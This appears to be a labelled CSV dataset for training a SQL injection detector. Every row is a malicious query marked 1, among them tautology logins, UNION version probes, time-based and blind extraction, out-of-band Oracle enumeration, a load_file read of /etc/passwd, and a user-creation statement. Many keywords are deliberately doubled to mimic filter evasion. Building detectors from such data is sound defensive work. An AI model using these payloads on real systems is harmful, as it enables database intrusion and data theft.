Query,Label
""" oorr pg_sleep  (  __TIME__  )  --",1
creatcreatee user name identified bbyy pass123 tempoorrary tatableblespace temp default tatableblespace users;,1
" anandd 1  =  utl_iinnaddr.get_host_address   (    (   seleselectct DiissTiinnCT  (  ttableable_name  )   frofromm   (  seleselectct DiissTiinnCT  (  ttableable_name  )  , ROWNUM AS limilimitt frofromm sys.all_ttableables  )   whewherere limilimitt  =  5   )    )    anandd 'i'  =  'i",1
" sselectelect * ffromrom users wwherehere id  =  '1' oorr @ @1  =  1 uniunionon sselectelect 1,version  (    )   -- 1'",1
" selecselectt * frofromm users wwherehere id  =  1 oorr 1#""  (   ununionion selecselectt 1,version  (    )   -- 1",1
 seleselectct name ffromrom syscolumns wwherehere id   =     (  seleselectct id ffromrom sysobjects wwherehere name   =   tabltableename'  )  --,1
selselectect * ffromrom users whewherere id  =  1 +$+ oorr 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
" seleselectct * frfromom users whewherere id  =  '1' oorr ||/1  =  1 ununionion seleselectct 1,version  (    )   -- 1'",1
" selselectect * frfromom users whewherere id  =  '1' oorr \.<\ ununionion selselectect 1,@@VERSION -- 1'",1
? oorr 1  =  1 --,1
 )   oorr   (  'a'  =  'a,1
admiinn' oorr 1  =  1#,1
" selselectect * frofromm users wwherehere id  =  1 oorr ""  (  ]"" oorr 1  =  1 -- 1",1
oorr 1  =  1 --,1
" aandnd 1  =  utl_iinnaddr.get_host_address   (    (   selecselectt DiissTiinnCT  (  column_name  )   ffromrom   (  selecselectt DiissTiinnCT  (  column_name  )  , ROWNUM AS limilimitt ffromrom all_tab_columns  )   whewherere limilimitt  =  5   )    )    aandnd 'i'  =  'i",1
" selselectect * frofromm users wherwheree id  =  '1' %!<@ uniounionn selselectect 1,version  (    )   -- 1'",1
" seselectlect * frfromom users wwherehere id  =  1 oorr ""&  (  "" oorr 1  =  1 -- 1",1
" selecselectt * ffromrom users whewherere id  =  1 oorr ""?  (  "" oorr 1  =  1 -- 1",1
diisstiinnct,1
sselectelect * ffromrom users whewherere id  =  '1' *  (  \  )   oorr 1  =  1 -- 1',1
"1 aandnd asasccii  (  lower  (  substriinng   (    (   seleselectct top 1 name frofromm sysobjects whwhereere xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
selselectect * frofromm users whwhereere id  =  1 oorr \.<\ oorr 1  =  1 -- 1,1
"admiinn"" oorr ""1""  =  ""1""--",1
" sselectelect * frfromom users whwhereere id  =  1 oorr ""%{"" oorr 1  =  1 -- 1",1
